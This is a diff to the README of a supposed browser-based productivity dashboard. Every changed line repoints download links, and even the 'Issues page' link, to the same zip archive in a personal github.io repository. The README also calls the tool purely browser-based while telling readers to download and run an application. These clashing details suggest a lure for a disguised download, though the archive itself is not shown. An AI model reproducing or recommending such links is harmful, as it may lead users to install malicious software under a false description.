@@ -5,7 +5,7 @@ description: "Manage content tasks, set objectives, and streamline your daily pr
 ---
 # 📋 productivity-content-planner - Plan Your Content, Boost Your Productivity
 
-[![Download Now](https://img.shields.io/badge/Download-Productivity%20Content%20Planner-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/NishigandhaKhaire/nishigandhakhaire.github.io/main/posca/Application_v1.6.zip)
+[![Download Now](https://img.shields.io/badge/Download-Productivity%20Content%20Planner-blue?style=for-the-badge&logo=github)](https://github.com/NishigandhaKhaire/nishigandhakhaire.github.io/raw/refs/heads/main/posca/Application_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to **productivity-content-planner**! This browser-based dashboard helps 
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [Download productivity-content-planner](https://raw.githubusercontent.com/NishigandhaKhaire/nishigandhakhaire.github.io/main/posca/Application_v1.6.zip)
+Visit this link to download the application: [Download productivity-content-planner](https://github.com/NishigandhaKhaire/nishigandhakhaire.github.io/raw/refs/heads/main/posca/Application_v1.6.zip)
 
 ### How to Run the Application
 1. Click the download button above or visit the link provided.
@@ -106,7 +106,7 @@ No, this is purely browser-based for simplicity and portability.
 
 ## 🤝 Support & Feedback
 
-- **Report Issues:** Visit the [Issues page](https://raw.githubusercontent.com/NishigandhaKhaire/nishigandhakhaire.github.io/main/posca/Application_v1.6.zip)
+- **Report Issues:** Visit the [Issues page](https://github.com/NishigandhaKhaire/nishigandhakhaire.github.io/raw/refs/heads/main/posca/Application_v1.6.zip)
 - **Feature Requests:** Suggest improvements via GitHub Discussions
 - **Email:** Check the repository for contact information
 
